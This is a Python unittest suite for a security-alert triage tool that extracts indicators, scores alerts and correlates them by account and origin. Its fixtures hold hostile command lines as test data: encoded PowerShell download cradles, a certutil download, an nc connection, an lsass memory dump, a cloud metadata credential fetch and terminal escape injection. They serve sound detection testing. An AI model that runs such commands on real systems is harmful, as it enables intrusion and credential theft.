"""
Test suite - stdlib unittest only.

    python -m unittest discover -s tests -v

These guard scoring behaviour rather than plumbing. A weight that drifts in
silence is worse than a tool that fails loudly.
"""

import io
import json
import os
import shutil
import sys
import tempfile
import unittest
from datetime import datetime

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from triage import attack, cli, correlate, engine, extract, notify, report, score  # noqa: E402
from triage.enrich import Enricher, OfflineProvider  # noqa: E402


def load_config():
    with open(os.path.join(ROOT, "config", "triage.json"), encoding="utf-8") as handle:
        return json.load(handle)


def offline_enricher():
    provider = OfflineProvider(os.path.join(ROOT, "samples", "mock-intel.json"))
    return Enricher([provider], cache_path=None)


class TestExtraction(unittest.TestCase):
    def test_extracts_ip_url_and_hash(self):
        finding = {
            "CommandLine": "certutil.exe -urlcache -f http://203.0.113.233/a.exe C:\\x\\a.exe",
            "Hashes": "SHA256=7446D75F3DFEE276699F5ABBDD774098006130E6576AB85FDE1D44F58455214E",
        }
        found = {(i["type"], i["value"]) for i in extract.extract(finding)}
        self.assertIn(("ip", "203.0.113.233"), found)
        self.assertIn(("url", "http://203.0.113.233/a.exe"), found)
        self.assertIn(
            ("hash", "7446d75f3dfee276699f5abbdd774098006130e6576ab85fde1d44f58455214e"), found
        )

    # Real powershell.exe -enc blobs are UTF-16LE; the decoder falls back to
    # UTF-8 because other tooling (certutil -decode, curl bodies) is not.
    UTF16_BLOB = ("SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
                  "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAA"
                  "OgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAyADMAMwAvAGIAZQBhAGMAbwBuAC4AcABz"
                  "ADEAJwApAA==")
    UTF8_BLOB = ("SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw"
                 "Oi8vMjAzLjAuMTEzLjIzMy9iZWFjb24ucHMxJyk=")

    def _assert_cradle_recovered(self, blob):
        finding = {"CommandLine": "powershell.exe -nop -w hidden -enc " + blob}

        decoded = extract.decoded_commands(finding)
        self.assertTrue(any("DownloadString" in d for d in decoded))

        ips = [i for i in extract.extract(finding) if i["type"] == "ip"]
        self.assertEqual(["203.0.113.233"], [i["value"] for i in ips])
        self.assertTrue(ips[0]["via_decode"], "indicator recovered by decoding must be flagged")

    def test_decodes_utf16le_encoded_powershell_and_flags_it(self):
        self._assert_cradle_recovered(self.UTF16_BLOB)

    def test_decodes_utf8_base64_as_a_fallback(self):
        self._assert_cradle_recovered(self.UTF8_BLOB)

    def test_dotnet_type_names_are_not_domains(self):
        finding = {"CommandLine": "New-Object Net.WebClient; [System.Convert]::ToBase64String($b)"}
        domains = [i["value"] for i in extract.extract(finding) if i["type"] == "domain"]
        self.assertEqual([], domains)

    def test_filenames_are_not_domains(self):
        finding = {"CommandLine": "rundll32.exe comsvcs.dll, MiniDump 704 lsass.dmp full"}
        domains = [i["value"] for i in extract.extract(finding) if i["type"] == "domain"]
        self.assertEqual([], domains)

    def test_version_strings_are_not_indicators(self):
        # "10.0.22.1" in a --version argument is shaped exactly like an address.
        finding = {"CommandLine": "setup.exe --version 10.0.22.1 /quiet"}
        self.assertEqual([], [i for i in extract.extract(finding) if i["type"] == "ip"])

    def test_a_real_address_after_a_verbose_flag_still_counts(self):
        # The version guard must not swallow "nc -v <c2> <port>".
        finding = {"CommandLine": "nc -v 203.0.113.9 4444"}
        ips = [i["value"] for i in extract.extract(finding) if i["type"] == "ip"]
        self.assertEqual(["203.0.113.9"], ips)

    def test_bearer_tokens_are_not_decoded_into_phantom_indicators(self):
        jwt = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
               "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
               "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
        finding = {"CommandLine": "curl -H \"Authorization: Bearer " + jwt + "\" https://internal.corp.com/api"}
        self.assertEqual([], [i for i in extract.extract(finding) if i["via_decode"]])

    def test_rfc1918_is_internal_but_documentation_range_is_not(self):
        internal = extract.extract({"CommandLine": "\\\\10.20.5.14\\share"})
        self.assertEqual("internal", internal[0]["scope"])
        external = extract.extract({"CommandLine": "curl http://192.0.2.47/"})
        ip = next(i for i in external if i["type"] == "ip")
        self.assertEqual("external", ip["scope"])


class TestIndicatorRoles(unittest.TestCase):
    """Where an address was found decides which direction it points."""

    def test_command_line_indicators_are_destinations(self):
        found = extract.extract({"CommandLine": "curl http://203.0.113.233/a.exe"})
        self.assertTrue(all(i["role"] == "destination" for i in found))

    def test_logon_origin_is_tagged_as_a_source(self):
        found = extract.extract({"SourceIp": "198.51.100.30", "CommandLine": ""})
        ip = next(i for i in found if i["type"] == "ip")
        self.assertEqual("source", ip["role"])
        self.assertEqual("external", ip["scope"])

    def test_affected_host_is_an_asset_not_an_indicator(self):
        found = extract.extract({"Host": "10.20.7.41", "CommandLine": ""})
        self.assertEqual("asset", found[0]["role"])

    def test_the_same_address_can_be_both_source_and_destination(self):
        found = extract.extract(
            {"SourceIp": "10.20.7.41", "CommandLine": "ping 10.20.7.41"}
        )
        roles = {i["role"] for i in found if i["type"] == "ip"}
        self.assertEqual({"source", "destination"}, roles)

    def test_ipv6_origins_are_visible(self):
        external = extract.extract({"SourceIp": "2001:db8::dead:beef", "CommandLine": ""})
        ip = next(i for i in external if i["role"] == "source")
        self.assertEqual("external", ip["scope"])
        internal = extract.extract({"SourceIp": "fd00::5", "CommandLine": ""})
        self.assertEqual("internal", next(i for i in internal if i["role"] == "source")["scope"])

    def test_address_fields_are_not_base64_decoded(self):
        # Decoding an address field could only invent indicators that are not there.
        found = extract.extract({"SourceIp": "198.51.100.30"})
        self.assertTrue(all(not i["via_decode"] for i in found))

    def test_asset_never_drives_the_intel_score(self):
        iocs = [{"type": "ip", "value": "10.0.0.5", "role": "asset",
                 "via_decode": False, "intel": {"verdict": "asset"}}]
        driver, verdict = score.worst_verdict(iocs)
        self.assertIsNone(driver)
        self.assertEqual("unknown", verdict)

    def test_internal_source_gets_no_discount(self):
        # An internal *source* is lateral movement, so it must never collect the
        # -10 an internal destination earns.
        iocs = [{"type": "ip", "value": "10.20.7.41", "role": "source",
                 "via_decode": False, "intel": {"verdict": "internal"}}]
        driver, _ = score.worst_verdict(iocs)
        self.assertIsNone(driver)


class TestOriginScoring(unittest.TestCase):
    def setUp(self):
        self.config = load_config()

    def _alert(self, **overrides):
        alert = {
            "finding": {"Severity": "Medium", "Attack": "T1021.001", "User": "CORP\\mkaya"},
            "iocs": [],
            "timestamp": datetime(2026, 8, 20, 14, 0, 0),
            "account_type": "standard",
        }
        alert.update(overrides)
        return alert

    def test_external_origin_outranks_internal_origin_outranks_none(self):
        local = score.score_alert(self._alert(), self.config)["score"]
        internal = score.score_alert(
            self._alert(source_ip="10.20.7.41", source_scope="internal"), self.config
        )["score"]
        external = score.score_alert(
            self._alert(source_ip="198.51.100.30", source_scope="external"), self.config
        )["score"]
        self.assertLess(local, internal)
        self.assertLess(internal, external)

    def test_origin_appears_in_the_explanation(self):
        alert = score.score_alert(
            self._alert(source_ip="198.51.100.30", source_scope="external"), self.config
        )
        self.assertTrue(
            any("198.51.100.30" in c["label"] for c in alert["contributions"]),
            "the analyst must be able to see which address drove the modifier",
        )


class TestSharedOriginCorrelation(unittest.TestCase):
    """One address across many accounts: what grouping by user cannot show."""

    def setUp(self):
        self.config = load_config()

    def _alert(self, index, user, origin):
        return {
            "id": f"ALRT-{index:04d}",
            "finding": {"Attack": "T1110.003", "RuleId": "AUTH", "User": user, "Severity": "Low"},
            "timestamp": datetime(2026, 8, 20, 3, 12, index),
            "account_key": score.account_name(user).lower(),
            "source_ip": origin,
            "source_scope": "external",
            "score": 10,
            "account_type": "standard",
            "iocs": [],
        }

    def test_one_origin_across_several_accounts_is_flagged(self):
        alerts = [
            self._alert(1, "CORP\\jdoe", "198.51.100.30"),
            self._alert(2, "CORP\\mkaya", "198.51.100.30"),
            self._alert(3, "CORP\\ademir", "198.51.100.30"),
        ]
        result = correlate.correlate_origins(alerts, self.config)
        self.assertEqual(3, len(result), "every alert from that origin should carry the flag")
        self.assertIn("3 accounts", result["ALRT-0001"][0]["label"])

    def test_one_account_from_one_origin_is_not_flagged(self):
        alerts = [
            self._alert(1, "CORP\\jdoe", "198.51.100.30"),
            self._alert(2, "CORP\\jdoe", "198.51.100.30"),
        ]
        self.assertEqual({}, correlate.correlate_origins(alerts, self.config))

    def test_different_origins_are_not_conflated(self):
        alerts = [
            self._alert(1, "CORP\\jdoe", "198.51.100.30"),
            self._alert(2, "CORP\\mkaya", "203.0.113.9"),
        ]
        self.assertEqual({}, correlate.correlate_origins(alerts, self.config))

    def test_alerts_without_an_origin_are_ignored(self):
        alerts = [self._alert(1, "CORP\\jdoe", None), self._alert(2, "CORP\\mkaya", None)]
        self.assertEqual({}, correlate.correlate_origins(alerts, self.config))


class TestAttackMapping(unittest.TestCase):
    def test_sub_techniques_resolve_to_parent_tactic(self):
        self.assertEqual(["Credential Access"], attack.tactics("T1003.001"))

    def test_primary_tactic_is_the_latest_in_the_kill_chain(self):
        # A download cradle touches two tactics, and the later one wins.
        self.assertEqual("Command and Control", attack.primary_tactic("T1105 / T1059.001"))

    def test_chain_spread_counts_distinct_tactics(self):
        count, tactics = attack.chain_spread(["T1566", "T1059.001", "T1547.001", "T1566"])
        self.assertEqual(3, count)
        self.assertEqual(["Initial Access", "Execution", "Persistence"], tactics)


class TestScoring(unittest.TestCase):
    def setUp(self):
        self.config = load_config()

    def _alert(self, **overrides):
        alert = {
            "finding": {"Severity": "Medium", "Attack": "T1059.001", "User": "CORP\\jdoe"},
            "iocs": [],
            "timestamp": datetime(2026, 8, 20, 14, 0, 0),  # a Thursday, in hours
            "account_type": "standard",
        }
        alert.update(overrides)
        return alert

    def test_score_is_the_sum_of_its_stated_contributions(self):
        alert = score.score_alert(self._alert(), self.config)
        self.assertEqual(sum(c["points"] for c in alert["contributions"]), alert["raw_score"])

    def test_malicious_indicator_raises_the_score(self):
        clean = score.score_alert(self._alert(), self.config)["score"]
        with_bad = score.score_alert(
            self._alert(iocs=[{"type": "ip", "value": "1.2.3.4", "via_decode": False,
                               "scope": "external", "intel": {"verdict": "malicious"}}]),
            self.config,
        )["score"]
        self.assertGreater(with_bad, clean)

    def test_out_of_hours_activity_scores_higher_than_the_same_alert_in_hours(self):
        in_hours = score.score_alert(self._alert(), self.config)["score"]
        at_night = score.score_alert(
            self._alert(timestamp=datetime(2026, 8, 20, 2, 17, 0)), self.config
        )["score"]
        self.assertGreater(at_night, in_hours)

    def test_score_is_clamped_to_0_100(self):
        alert = self._alert(
            finding={"Severity": "High", "Attack": "T1003", "User": "CORP\\admin_x"},
            account_type="privileged",
            iocs=[{"type": "ip", "value": "1.2.3.4", "via_decode": False,
                   "scope": "external", "intel": {"verdict": "malicious"}}],
        )
        correlation = {"contributions": [{"label": "x", "points": 90, "reason": "y"}]}
        result = score.score_alert(alert, self.config, correlation)
        self.assertEqual(100, result["score"])
        self.assertGreater(result["raw_score"], 100)

    def test_account_classification(self):
        patterns = self.config["account_patterns"]
        self.assertEqual("privileged", score.classify_account("CORP\\admin_bt", patterns))
        self.assertEqual("service", score.classify_account("CORP\\svc_backup", patterns))
        self.assertEqual("standard", score.classify_account("CORP\\jdoe", patterns))

    def test_band_boundaries_follow_the_config(self):
        self.assertEqual("Critical", score.band_for(85, self.config)["name"])
        self.assertEqual("High", score.band_for(84, self.config)["name"])
        self.assertEqual("Informational", score.band_for(0, self.config)["name"])


class TestTimestampParsing(unittest.TestCase):
    """A findings file must score the same on 3.8 as on 3.12, so the grammar is
    matched here rather than left to fromisoformat."""

    def test_powershells_own_json_date_format_is_accepted(self):
        # ConvertTo-Json renders a DateTime this way. Refusing it costs every
        # finding from a PowerShell producer its timestamp, which is business
        # hours, burst correlation and the case window all at once.
        self.assertEqual(datetime(2026, 8, 22, 13, 52, 19, 178000),
                         score.parse_time("/Date(1787406739178)/"))
        self.assertEqual(datetime(2026, 8, 22, 13, 52, 19, 178000),
                         score.parse_time("/Date(1787406739178+0300)/"))
        self.assertIsNone(score.parse_time("/Date(abc)/"))

    def test_the_common_forms_all_land_on_the_same_moment(self):
        expected = datetime(2026, 8, 20, 3, 12, 4)
        for text in ("2026-08-20T03:12:04", "2026-08-20 03:12:04", "2026-08-20T03:12:04Z",
                     "20260820T031204", "2026-08-20T03:12:04+03:00", "2026-08-20T03:12:04-0500"):
            self.assertEqual(expected, score.parse_time(text), text)

    def test_fractional_seconds_of_any_width_are_accepted(self):
        for text, micro in (("2026-08-20T03:12:04.12", 120000),
                            ("2026-08-20T03:12:04.1234", 123400),
                            ("2026-08-20T03:12:04,123456", 123456)):
            self.assertEqual(micro, score.parse_time(text).microsecond, text)

    def test_an_offset_never_produces_an_aware_datetime(self):
        # One aware value meeting a naive one is a TypeError that aborts the batch.
        self.assertIsNone(score.parse_time("2026-08-20T03:12:04+03:00").tzinfo)

    def test_unparseable_input_is_none_not_an_exception(self):
        for text in ("", None, "yesterday", "2026-13-45T99:99:99"):
            self.assertIsNone(score.parse_time(text), repr(text))

    def test_a_batch_mixing_offsets_and_bare_timestamps_still_triages(self):
        findings = [
            {"Severity": "Low", "RuleId": "R", "Attack": "T1059", "User": "CORP\\jdoe",
             "Time": "2026-08-20T03:12:04+03:00", "CommandLine": "whoami"},
            {"Severity": "Low", "RuleId": "R", "Attack": "T1059", "User": "CORP\\jdoe",
             "Time": "2026-08-20T03:12:09", "CommandLine": "whoami"},
        ]
        alerts, cases = engine.run(findings, load_config(), offline_enricher())
        self.assertEqual(2, len(alerts))
        self.assertEqual(1, len(cases))


class TestCorrelation(unittest.TestCase):
    def setUp(self):
        self.config = load_config()

    def _alerts(self, techniques, user="CORP\\jdoe"):
        return [
            {
                "finding": {"Attack": t, "RuleId": f"R{i}", "User": user, "Severity": "Low"},
                "timestamp": datetime(2026, 8, 20, 9, 40 + i),
                "account_key": score.account_name(user).lower(),
                "score": 10,
                "account_type": "standard",
                "iocs": [],
            }
            for i, t in enumerate(techniques)
        ]

    def test_kill_chain_progression_is_rewarded(self):
        spread = correlate.correlate(
            self._alerts(["T1566", "T1059", "T1547", "T1003"]), self.config
        )["jdoe"]["contributions"]
        self.assertTrue(any("ATT&CK tactics" in c["label"] for c in spread))

    def test_alerts_in_a_single_tactic_are_not_rewarded(self):
        spread = correlate.correlate(
            self._alerts(["T1059", "T1059.001", "T1204"]), self.config
        )["jdoe"]["contributions"]
        self.assertFalse(any("ATT&CK tactics" in c["label"] for c in spread))

    def test_accounts_are_correlated_independently(self):
        alerts = self._alerts(["T1566", "T1059"], "CORP\\a") + self._alerts(["T1547"], "CORP\\b")
        result = correlate.correlate(alerts, self.config)
        self.assertEqual({"a", "b"}, set(result))


class TestEndToEnd(unittest.TestCase):
    def setUp(self):
        self.config = load_config()
        with open(os.path.join(ROOT, "samples", "findings.json"), encoding="utf-8") as handle:
            self.findings = json.load(handle)

    def test_sample_batch_triages_and_ranks(self):
        alerts, cases = engine.run(self.findings, self.config, offline_enricher())
        self.assertEqual(len(self.findings), len(alerts))
        self.assertEqual([a["score"] for a in alerts], sorted((a["score"] for a in alerts), reverse=True))

        top = cases[0]
        self.assertIn("jdoe", top["account_key"])
        self.assertEqual("Critical", top["band"]["name"])
        self.assertIn("203.0.113.233", top["bad_indicators"])

    def test_compromised_account_outranks_the_benign_admin(self):
        _, cases = engine.run(self.findings, self.config, offline_enricher())
        by_account = {c["account_key"]: c["score"] for c in cases}
        self.assertGreater(by_account["jdoe"], by_account["admin_bt"])

    def test_every_alert_carries_an_explanation_and_a_playbook(self):
        alerts, _ = engine.run(self.findings, self.config, offline_enricher())
        for alert in alerts:
            self.assertTrue(alert["contributions"], f"{alert['id']} has no score breakdown")
            self.assertTrue(alert["playbook"], f"{alert['id']} has no playbook")
            self.assertTrue(alert["recommended_action"])

    def test_serialized_output_is_json_round_trippable(self):
        alerts, cases = engine.run(self.findings, self.config, offline_enricher())
        document = engine.to_serializable(alerts, cases, {"generated": "now", "version": "test"})
        restored = json.loads(json.dumps(document))
        self.assertEqual(len(alerts), len(restored["alerts"]))
        self.assertIn("score_breakdown", restored["alerts"][0])
        self.assertIn("raw_score", restored["alerts"][0],
                      "a JSON reader must be able to reconcile the breakdown with the clamp")

    def test_a_lone_low_finding_is_promoted_by_its_origin(self):
        """CORP\\ademir has one Low alert and no kill chain, so account-grouping
        alone leaves it at the bottom. It reaches High only because that origin
        also touched two other accounts."""
        _, cases = engine.run(self.findings, self.config, offline_enricher())
        ademir = next(c for c in cases if c["account_key"] == "ademir")
        self.assertEqual(1, ademir["alert_count"])
        self.assertEqual("Low", ademir["alerts"][0]["finding"]["Severity"])
        self.assertEqual("High", ademir["band"]["name"])
        self.assertTrue(
            any("touched 3 accounts" in c["label"]
                for c in ademir["alerts"][0]["contributions"])
        )

    def test_cases_record_hosts_and_origins(self):
        _, cases = engine.run(self.findings, self.config, offline_enricher())
        jdoe = next(c for c in cases if c["account_key"] == "jdoe")
        self.assertIn("WKSTN-0412", jdoe["hosts"])
        self.assertIn("198.51.100.30", jdoe["origins"])
        self.assertEqual("external", jdoe["origins"]["198.51.100.30"]["scope"])

    def test_lateral_movement_is_recognised_by_its_internal_origin(self):
        alerts, _ = engine.run(self.findings, self.config, offline_enricher())
        lateral = next(a for a in alerts if a["primary_tactic"] == "Lateral Movement")
        self.assertEqual("internal", lateral["source_scope"])
        self.assertTrue(any("another internal host" in c["label"]
                            for c in lateral["contributions"]))
        self.assertTrue(any("origin host" in step for step in lateral["playbook"]),
                        "a lateral-movement alert must get the lateral-movement playbook")

    def test_enricher_caches_repeated_indicators(self):
        enricher = offline_enricher()
        engine.run(self.findings, self.config, enricher)
        self.assertGreater(enricher.stats["cache_hits"], 0,
                           "the same C2 address appears in several findings and should be cached")


class TestRendering(unittest.TestCase):
    """Hostile or half-empty telemetry must not stop a report being written, and
    nothing a finding carries may steer the terminal."""

    HOSTILE = [
        {"Severity": None, "RuleId": None, "Rule": None, "Attack": None, "Time": None,
         "Source": None, "Host": None, "User": None, "CommandLine": None, "Why": None},
        {"Severity": "Low", "RuleId": "NUMERIC-CMD", "Rule": "Non-string command line",
         "Attack": "T1059", "Time": "2026-08-20T09:00:00", "User": "CORP\\jdoe",
         "CommandLine": 12345},
        {"Severity": "High", "RuleId": "ESC", "Rule": "\x1b[2J\x1b[H\x1b[42;30mCLEARED",
         "Attack": "T1059", "Time": "2026-08-20T09:01:00", "User": "CORP\\jdoe",
         "CommandLine": "echo \x1b[31mred"},
    ]

    def setUp(self):
        report.enable_color(False)
        self.alerts, self.cases = engine.run(self.HOSTILE, load_config(), offline_enricher())
        self.meta = {"generated": "now", "version": "test", "input": "hostile.json",
                     "finding_count": len(self.HOSTILE), "enrichment": "offline",
                     "lookups": 0, "cache_hits": 0, "min_band": "Informational"}

    def _console(self):
        captured = io.StringIO()
        stdout = sys.stdout
        sys.stdout = captured
        try:
            report.print_console(self.alerts, self.cases, self.meta)
        finally:
            sys.stdout = stdout
        return captured.getvalue()

    def test_console_survives_nulls_and_a_non_string_command_line(self):
        text = self._console()
        self.assertIn("ALERT TRIAGE QUEUE", text)
        self.assertIn("12345", text, "a non-string command line must still render")
        self.assertIn("window: ?  ..  ?", text, "a missing time renders as '?', never 'None'")

    def test_no_escape_sequence_from_a_finding_reaches_the_terminal(self):
        self.assertNotIn("\x1b", self._console())

    def test_html_report_is_written_for_the_same_batch(self):
        findings = self.HOSTILE[1:]
        alerts, cases = engine.run(findings, load_config(), offline_enricher())
        meta = dict(self.meta, finding_count=len(findings))
        directory = tempfile.mkdtemp()
        try:
            path = report.write_html(os.path.join(directory, "hostile.html"),
                                     alerts, cases, meta)
            with open(path, encoding="utf-8") as handle:
                document = handle.read()
            self.assertIn("<!DOCTYPE html>", document)
            self.assertIn("12345", document, "a non-string command line must still render")
            self.assertNotIn("<script", document.lower())
        finally:
            shutil.rmtree(directory, ignore_errors=True)


class TestNotify(unittest.TestCase):
    def setUp(self):
        self.case = {
            "account": "CORP\\jdoe", "account_type": "standard", "score": 100,
            "band": {"name": "Critical", "queue": "Tier 2"}, "alert_count": 10,
            "tactics": ["Execution"], "bad_indicators": {"1.2.3.4": "malicious"},
            "first_seen": "2026-08-20 09:41:12", "last_seen": "2026-08-20 09:48:31",
            "summary": "test case.",
        }

    def test_platform_detection(self):
        self.assertEqual("slack", notify.detect_platform("https://hooks.slack.com/services/x"))
        self.assertEqual("discord", notify.detect_platform("https://discord.com/api/webhooks/1/x"))
        self.assertEqual("teams", notify.detect_platform("https://acme.webhook.office.com/x"))

    def test_payloads_are_json_serializable_for_every_platform(self):
        for platform in ("slack", "discord", "teams"):
            payload = notify.build_payload([self.case], platform, "test.json")
            self.assertIsInstance(json.dumps(payload), str, platform)


class TestScopeBoundaries(unittest.TestCase):
    """"Internal" is a claim about the estate, made on RFC1918 space and the
    estate's own DNS suffixes, not on anything that merely looks familiar."""

    def setUp(self):
        self.config = load_config()

    def _finding(self, command):
        return {"Severity": "Medium", "RuleId": "SCOPE", "Rule": "Scope fixture",
                "Attack": "T1059.001", "Time": "2026-08-20T14:00:00",
                "User": "CORP\\jdoe", "CommandLine": command}

    def test_link_local_is_its_own_scope_not_internal(self):
        found = extract.extract({"CommandLine": "curl http://169.254.169.254/latest/meta-data/"})
        ip = next(i for i in found if i["type"] == "ip")
        self.assertEqual("link_local", ip["scope"])
        v6 = extract.extract({"SourceIp": "fe80::1", "CommandLine": ""})
        self.assertEqual("link_local", next(i for i in v6 if i["type"] == "ip")["scope"])

    def test_cgnat_space_is_external(self):
        # 100.64.0.0/10 is carrier-assigned ISP space, not the enterprise's.
        found = extract.extract({"SourceIp": "100.64.3.9", "CommandLine": ""})
        self.assertEqual("external", next(i for i in found if i["type"] == "ip")["scope"])

    def test_metadata_endpoint_is_scored_up_never_discounted(self):
        alerts, _ = engine.run(
            [self._finding("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")],
            self.config, offline_enricher(),
        )
        contributions = alerts[0]["contributions"]
        self.assertTrue(
            any("metadata endpoint" in c["label"] for c in contributions),
            "reaching the instance metadata service is the cloud credential-theft route",
        )
        self.assertFalse(
            any(c["points"] < 0 for c in contributions),
            "a link-local address must never earn the internal discount",
        )

    def test_an_internal_fqdn_does_not_earn_the_external_destination_modifier(self):
        alerts, _ = engine.run(
            [self._finding("powershell.exe -File \\\\fileserver.corp.com\\deploy\\run.ps1")],
            self.config, offline_enricher(),
        )
        domain = next(i for i in alerts[0]["iocs"] if i["type"] == "domain")
        self.assertEqual("internal", domain["scope"],
                         "a suffix from config/triage.json makes the FQDN the estate's own")
        self.assertFalse(any("external destination" in c["label"]
                             for c in alerts[0]["contributions"]))

    def test_an_unknown_fqdn_still_earns_it(self):
        alerts, _ = engine.run(
            [self._finding("powershell.exe -File \\\\fileserver.evil-cdn.xyz\\deploy\\run.ps1")],
            self.config, offline_enricher(),
        )
        domain = next(i for i in alerts[0]["iocs"] if i["type"] == "domain")
        self.assertEqual("external", domain["scope"])
        self.assertTrue(any("external destination" in c["label"]
                            for c in alerts[0]["contributions"]))

    def test_nested_and_array_fields_are_scanned_with_the_parent_role(self):
        found = extract.extract({"CommandLine": {"raw": "http://203.0.113.233/x"},
                                 "SourceIp": {"value": "198.51.100.30"},
                                 "Extra": [{"deep": ["curl http://192.0.2.47/a"]}]})
        by_value = {i["value"]: i for i in found}
        self.assertIn("203.0.113.233", by_value)
        self.assertIn("192.0.2.47", by_value)
        self.assertEqual("source", by_value["198.51.100.30"]["role"],
                         "the role is inherited from the top-level field, not the nesting")

    def test_a_finding_that_is_not_an_object_yields_nothing(self):
        self.assertEqual([], extract.extract("just a string"))

    def test_shell_scripts_are_not_domains(self):
        self.assertEqual([], extract.extract({"CommandLine": "bash install.sh && ./entrypoint.sh"}))
        kept = extract.extract({"CommandLine": "curl https://get.docker.sh/x"})
        self.assertIn("get.docker.sh", {i["value"] for i in kept})


class TestBandOrdering(unittest.TestCase):
    """A hand-edited config that lists the bands in another order must still hand
    out the same queue."""

    def setUp(self):
        self.config = load_config()

    def test_banding_is_identical_when_risk_bands_are_reordered(self):
        shuffled = dict(self.config, risk_bands=list(reversed(self.config["risk_bands"])))
        for value in range(0, 101):
            self.assertEqual(
                score.band_for(value, self.config)["name"],
                score.band_for(value, shuffled)["name"],
                f"score {value} banded differently after the array was reordered",
            )
        self.assertEqual("Critical", score.band_for(100, shuffled)["name"])

    def test_band_rank_still_orders_critical_first(self):
        shuffled = dict(self.config, risk_bands=list(reversed(self.config["risk_bands"])))
        ranks = [score.band_rank(name, shuffled)
                 for name in ("Critical", "High", "Medium", "Low", "Informational")]
        self.assertEqual(sorted(ranks), ranks)
        self.assertEqual([0, 1, 2, 3, 4], ranks)

    def test_missing_risk_bands_does_not_raise(self):
        stripped = dict(self.config)
        stripped.pop("risk_bands")
        self.assertIsInstance(score.band_for(50, stripped), dict)


class TestSharedOriginWindows(unittest.TestCase):
    """The label is evidence, so it may only name accounts from a window the
    flagged alert was actually inside."""

    def setUp(self):
        self.config = load_config()

    def _alert(self, index, user, hour, minute):
        return {
            "id": f"ALRT-{index:04d}",
            "finding": {"Attack": "T1110.003", "RuleId": "AUTH", "User": user, "Severity": "Low"},
            "timestamp": datetime(2026, 8, 20, hour, minute, 0),
            "account_key": score.account_name(user).lower(),
            "source_ip": "198.51.100.30",
            "source_scope": "external",
            "score": 10,
            "account_type": "standard",
            "iocs": [],
        }

    def test_two_disjoint_windows_do_not_borrow_each_others_accounts(self):
        config = json.loads(json.dumps(self.config))
        config["correlation_modifiers"]["shared_origin"]["min_accounts"] = 2
        alerts = [
            self._alert(1, "CORP\\alice", 3, 0),
            self._alert(2, "CORP\\bob", 3, 0),
            self._alert(3, "CORP\\carol", 9, 0),
            self._alert(4, "CORP\\dave", 9, 0),
        ]
        result = correlate.correlate_origins(alerts, config)
        for alert_id, expected in (("ALRT-0001", ("alice", "bob")),
                                   ("ALRT-0003", ("carol", "dave"))):
            label = result[alert_id][0]["label"]
            self.assertIn("2 accounts", label)
            self.assertNotIn("4 accounts", label)
            for name in expected:
                self.assertIn(name, label)

    def test_the_label_states_the_window_it_measured(self):
        alerts = [self._alert(1, "CORP\\alice", 3, 0),
                  self._alert(2, "CORP\\bob", 3, 5),
                  self._alert(3, "CORP\\carol", 3, 9)]
        label = correlate.correlate_origins(alerts, self.config)["ALRT-0001"][0]["label"]
        self.assertIn("within 30 minutes", label)

    def test_two_accounts_do_not_meet_the_configured_threshold(self):
        # Two users behind one NAT gateway is an office, not a spray.
        alerts = [self._alert(1, "CORP\\alice", 3, 0), self._alert(2, "CORP\\bob", 3, 5)]
        self.assertEqual({}, correlate.correlate_origins(alerts, self.config))


class TestCommandLine(unittest.TestCase):
    """The exit code is a scheduler's only signal, and a malformed file must fail
    with a sentence, not a traceback."""

    SAMPLES = os.path.join(ROOT, "samples", "findings.json")

    def _run(self, argv):
        stderr, sys.stderr = sys.stderr, io.StringIO()
        try:
            code = cli.main(argv)
            return code, sys.stderr.getvalue()
        except SystemExit as exit_code:
            return exit_code.code, sys.stderr.getvalue()
        finally:
            sys.stderr = stderr

    HIGH_ONLY = [
        {"Severity": "High", "RuleId": "RDP", "Rule": "Interactive logon to a server",
         "Attack": "T1021.001", "Time": "2026-08-20T02:30:00", "Host": "SRV-FILE-02",
         "User": "CORP\\mkaya", "SourceIp": "10.20.7.41", "LogonType": "10"},
    ]

    def _batch(self, findings):
        directory = tempfile.mkdtemp()
        path = os.path.join(directory, "batch.json")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(findings, handle)
        self.addCleanup(shutil.rmtree, directory, True)
        return path

    def test_min_band_is_display_only_and_never_changes_the_exit_code(self):
        unfiltered, _ = self._run(["-i", self.SAMPLES, "--quiet", "--no-cache"])
        filtered, _ = self._run(
            ["-i", self.SAMPLES, "--quiet", "--no-cache", "--min-band", "Critical"]
        )
        self.assertEqual(1, unfiltered, "the sample batch contains a High+ case")
        self.assertEqual(unfiltered, filtered,
                         "hiding a case from the report cannot make it stop needing a human")

    def test_hiding_the_only_high_case_still_exits_1_and_says_so(self):
        path = self._batch(self.HIGH_ONLY)
        code, warning = self._run(["-i", path, "--quiet", "--no-cache"])
        self.assertEqual(1, code)
        hidden, warning = self._run(
            ["-i", path, "--quiet", "--no-cache", "--min-band", "Critical"]
        )
        self.assertEqual(1, hidden)
        self.assertIn("--min-band", warning,
                      "an analyst must be told a High+ case was hidden from the view")

    def test_a_low_only_batch_exits_0(self):
        path = self._batch([{"Severity": "Low", "RuleId": "RECON", "Rule": "recon",
                             "Attack": "T1033", "Time": "2026-08-20T14:00:00",
                             "User": "CORP\\jdoe", "CommandLine": "whoami /all"}])
        code, _ = self._run(["-i", path, "--quiet", "--no-cache"])
        self.assertEqual(0, code)

    def test_a_non_object_element_is_reported_with_its_index(self):
        directory = tempfile.mkdtemp()
        try:
            path = os.path.join(directory, "broken.json")
            with open(path, "w", encoding="utf-8") as handle:
                json.dump([{"Severity": "Low", "Rule": "ok"}, "truncated"], handle)
            code, message = self._run(["-i", path, "--quiet", "--no-cache"])
            self.assertEqual(2, code)
            self.assertIn("findings[1]", message)
            self.assertIn("string", message)
            self.assertNotIn("Traceback", message)
        finally:
            shutil.rmtree(directory, ignore_errors=True)

    def test_a_config_missing_a_required_key_fails_before_enrichment(self):
